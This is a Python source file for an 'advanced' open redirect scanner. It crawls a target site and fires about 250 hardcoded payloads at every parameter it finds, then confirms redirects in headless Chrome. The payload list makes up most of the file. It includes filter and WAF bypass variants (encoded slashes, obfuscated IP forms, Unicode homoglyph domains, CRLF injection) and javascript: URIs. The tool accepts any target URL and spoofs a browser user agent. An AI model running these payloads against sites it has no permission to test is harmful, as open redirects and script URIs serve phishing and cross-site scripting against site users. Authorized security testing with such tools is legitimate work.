#!/usr/bin/env python3
"""
Advanced Open Redirect Vulnerability Scanner
Professional scanner for comprehensive open redirect testing
Author: Security Researcher
Version: 1.0
"""

import asyncio
import aiohttp
import json
import logging
import os
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Set, Tuple, Optional
import argparse
import base64
import hashlib
import random
import string
import re
from urllib.parse import urljoin, urlparse, parse_qs, unquote
import threading
from queue import Queue

# Import our custom modules
from recon_module import ReconModule
from payload_module import PayloadModule
from chrome_module import ChromeModule
from report_module import ReportModule
from logging_module import LoggingModule

class OpenRedirectScanner:
    """
    Advanced Open Redirect Vulnerability Scanner
    Comprehensive testing with smart crawling and WAF bypass techniques
    """
    
    def __init__(self, target_url: str, output_dir: str = "scan_results", max_threads: int = 10):
        self.target_url = target_url
        self.output_dir = Path(output_dir)
        self.max_threads = max_threads
        self.results = []
        self.vulnerabilities = []
        self.scanned_urls = set()
        self.session = None
        
        # Initialize modules
        self.logger = LoggingModule(self.output_dir)
        self.recon = ReconModule(self.logger)
        self.payloads = PayloadModule(self.logger)
        self.chrome = ChromeModule(self.logger, self.output_dir)
        self.reporter = ReportModule(self.output_dir)
        
        # Create output directory
        self.output_dir.mkdir(exist_ok=True)
        
        # Load custom payloads
        self.custom_payloads = self._load_custom_payloads()
        
    def _load_custom_payloads(self) -> List[str]:
        """Load custom payloads provided by user"""
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "//www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e%2f",
            "////www.google.com/%2e%2e%2f",
            "https://www.google.com/%2e%2e%2f",
            "///www.google.com/%2e%2e",
            "////www.google.com/%2e%2e",
            "https:///www.google.com/%2e%2e",
            "/https://www.google.com/%2e%2e",
            "https:///www.google.com/%2f%2e%2e",
            "https://%09/google.com",
            "https:google.com",
            "//google%E3%80%82com",
            "\\/\\/google.com/",
            "/\\/google.com/",
            "http://0xd8.0x3a.0xd6.0xce",
            "〱google.com",
            "〵google.com",
            "ゝgoogle.com",
            "ーgoogle.com",
            "ｰgoogle.com",
            "/〱google.com",
            "/〵google.com",
            "/ゝgoogle.com",
            "/ーgoogle.com",
            "/ｰgoogle.com",
            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "///google.com/%2e%2e",
            "///google.com/%2e%2e%2f",
            "///google.com/%2f%2e%2e",
            "//google.com",
            "//google.com/%2e%2e",
            "//google.com/%2e%2e%2f",
            "//google.com/%2f%2e%2e",
            "//https:///google.com/%2e%2e",
            "//https://google.com/%2e%2e%2f",
            "/&lt;&gt;//google.com",
            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/?url=/\\/google.com&next=/\\/google.com&redirect=/\\/google.com&redirect_uri=/\\/google.com",
            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\\/\\/google.com/",
            "/google.com/%2f%2e%2e",
            "/http://google.com",
            "/http:/google.com",
            "/https:/%5cgoogle.com/",
            "/https://%5cgoogle.com",
            "/https://google.com/%2e%2e",
            "/https://google.com/%2f%2e%2e",
            "/https:google.com",
            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
            "//%2fxgoogle.com",
            "//localdomain%E3%80%82pw",
            "http://0xd83ad6ce",
            "http://3627734734",
            "http://472.314.470.462",
            "http://0330.072.0326.0316",
            "http://00330.00072.0000326.00000316",
            "http://0xd8.072.54990",
            "http://0xd8.3856078",
            "http://00330.3856078",
            "http://00330.0x3a.54990",
            "http:0xd8.0x3a.0xd6.0xce",
            "http:0xd83ad6ce",
            "http:3627734734",
            "http:472.314.470.462",
            "http:0330.072.0326.0316",
            "http:00330.00072.0000326.00000316",
            "http:[::216.58.214.206]",
            "http:[::ffff:216.58.214.206]",
            "http:0xd8.072.54990",
            "http:0xd8.3856078",
            "http:00330.3856078",
            "http:00330.0x3a.54990",
            "&lt;&gt;//google.com",
            "http://.google.com",
            "https://google.com/https://google.com/",
            "http://google.com\tgoogle.com/",
            "//google.com\tgoogle.com/",
            "http://google.com%2f%2f.google.com/",
            "http://google.com%5c%5c.google.com/",
            "http://google.com%3F.google.com/",
            "http://google.com%23.google.com/",
            "http://google.com:80%40google.com/",
            "http://google.com%2egoogle.com/",
            "/〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "$2f%2f216.58.214.206%2f%2f",
            "$2f%2f3627734734%2f%2f",
            "$2f%2fgoogle.com",
            "$2f%2fgoogle.com%2f%2f",
            "%01https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////216.58.214.206",
            "///216.58.214.206",
            "//216.58.214.206",
            "/\\216.58.214.206",
            "/216.58.214.206",
            "216.58.214.206",
            "%2f$2f216.58.214.206",
            "%2f$2f3627734734",
            "%2f$2fgoogle.com",
            "%2f216.58.214.206",
            "%2f216.58.214.206//",
            "%2f216.58.214.206%2f%2f",
            "//%2f%2fgoogle.com",
            "/%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "%2f3627734734",
            "%2f3627734734//",
            "%2f3627734734%2f%2f",
            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
            "%2fgoogle.com",
            "%2fgoogle.com//",
            "\\google.com",
            "%2fgoogle.com%2f%2f",
            "////3627734734",
            "///3627734734",
            "//3627734734",
            "/\\3627734734",
            "/3627734734",
            "//%2F/google.com",
            "/%0D/google.com",
            "/%2F/google.com",
            "/%5Cgoogle.com",
            "/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "////%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/\\google%252ecom",
            "google%252ecom",
            "../google.com",
            "//google%00.com",
            "////google.com",
            "//\\/google.com/",
            "//\\google.com",
            "/<>//google.com",
            "/\\/\\/google.com/",
            "/\\/google.com",
            "/\\google.com",
            "/google.com",
            "//google.com/%2E%2E",
            "//google.com/%2F..",
            "/google.com/%2F..",
            "//google.com//%2F%2E%2E",
            "google.com/.jpg",
            "http:%0a%0dgoogle.com",
            "http:%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:/\\/\\google.com",
            "http:/google.com",
            "http:google.com",
            "/http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http://.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "http:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https://%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https://%0a%0dgoogle.com",
            "https://%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https%3a%2f%2fgoogle.com%2f",
            "https:/%5cgoogle.com/",
            "/https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "/https://%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
            "https:/\\google.com",
            "https://google%E3%80%82com",
            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "https:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "/https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ",
            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw",
            "/.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "//\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
            "/\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "<>//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
            "\\/\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e"
        ]
    
    async def initialize(self):
        """Initialize the scanner and all modules"""
        try:
            self.logger.info("Initializing Open Redirect Scanner...")
            
            # Initialize Chrome module
            await self.chrome.initialize()
            
            # Initialize HTTP session
            connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
            timeout = aiohttp.ClientTimeout(total=30, connect=10)
            self.session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
            )
            
            self.logger.info("Scanner initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize scanner: {str(e)}")
            return False
    
    async def scan(self):
        """Main scanning function"""
        try:
            self.logger.info(f"Starting comprehensive scan of: {self.target_url}")
            
            # Step 1: Comprehensive Reconnaissance
            self.logger.info("Phase 1: Comprehensive Reconnaissance")
            recon_results = await self.recon.perform_recon(self.target_url, self.session)
            
            if not recon_results:
                self.logger.error("Reconnaissance failed, aborting scan")
                return False
            
            # Step 2: Extract all parameters and injection points
            self.logger.info("Phase 2: Parameter Extraction")
            injection_points = self.recon.extract_injection_points(recon_results)
            
            self.logger.info(f"Found {len(injection_points)} injection points")
            
            # Step 3: Test payloads with parallel processing
            self.logger.info("Phase 3: Payload Testing")
            vulnerabilities = await self._test_payloads_parallel(injection_points)
            
            # Step 4: Generate comprehensive report
            self.logger.info("Phase 4: Report Generation")
            await self.reporter.generate_report(vulnerabilities, self.target_url)
            
            self.logger.info(f"Scan completed. Found {len(vulnerabilities)} vulnerabilities")
            return True
            
        except Exception as e:
            self.logger.error(f"Scan failed: {str(e)}")
            return False
    
    async def _test_payloads_parallel(self, injection_points: List[Dict]) -> List[Dict]:
        """Test payloads using parallel processing"""
        vulnerabilities = []
        
        # Create task queue
        task_queue = Queue()
        for point in injection_points:
            for payload in self.custom_payloads:
                task_queue.put((point, payload))
        
        # Process tasks in parallel
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            while not task_queue.empty():
                point, payload = task_queue.get()
                future = executor.submit(self._test_single_payload, point, payload)
                futures.append(future)
            
            # Collect results
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    self.logger.error(f"Payload test failed: {str(e)}")
        
        return vulnerabilities
    
    def _test_single_payload(self, injection_point: Dict, payload: str) -> Optional[Dict]:
        """Test a single payload against an injection point"""
        try:
            # Create test URL with payload
            test_url = self._construct_test_url(injection_point, payload)
            
            # Test with Chrome automation
            result = asyncio.run(self.chrome.test_redirect(test_url, payload))
            
            if result and result.get('vulnerable'):
                vulnerability = {
                    'url': test_url,
                    'parameter': injection_point.get('parameter'),
                    'payload': payload,
                    'redirect_url': result.get('redirect_url'),
                    'screenshot_path': result.get('screenshot_path'),
                    'injection_type': injection_point.get('type'),
                    'timestamp': datetime.now().isoformat()
                }
                
                self.logger.info(f"Vulnerability found: {test_url}")
                return vulnerability
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error testing payload {payload}: {str(e)}")
            return None
    
    def _construct_test_url(self, injection_point: Dict, payload: str) -> str:
        """Construct test URL with payload"""
        base_url = injection_point['url']
        param_name = injection_point['parameter']
        param_type = injection_point['type']
        
        if param_type == 'url':
            # URL parameter
            parsed = urlparse(base_url)
            query_params = parse_qs(parsed.query)
            query_params[param_name] = [payload]
            
            new_query = '&'.join([f"{k}={v[0]}" for k, v in query_params.items()])
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        elif param_type == 'form':
            # Form parameter - would need to submit form
            return base_url
        
        elif param_type == 'header':
            # Header parameter
            return base_url
        
        elif param_type == 'cookie':
            # Cookie parameter
            return base_url
        
        elif param_type == 'javascript':
            # JavaScript variable
            return base_url
        
        else:
            return base_url
    
    async def cleanup(self):
        """Cleanup resources"""
        try:
            if self.session:
                await self.session.close()
            
            await self.chrome.cleanup()
            self.logger.info("Cleanup completed")
            
        except Exception as e:
            self.logger.error(f"Cleanup error: {str(e)}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Advanced Open Redirect Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-o', '--output', default='scan_results', help='Output directory')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    
    args = parser.parse_args()
    
    # Create scanner instance
    scanner = OpenRedirectScanner(args.target, args.output, args.threads)
    
    # Run scan
    async def run_scan():
        if await scanner.initialize():
            await scanner.scan()
        await scanner.cleanup()
    
    # Run the scan
    asyncio.run(run_scan())

if __name__ == "__main__":
    main()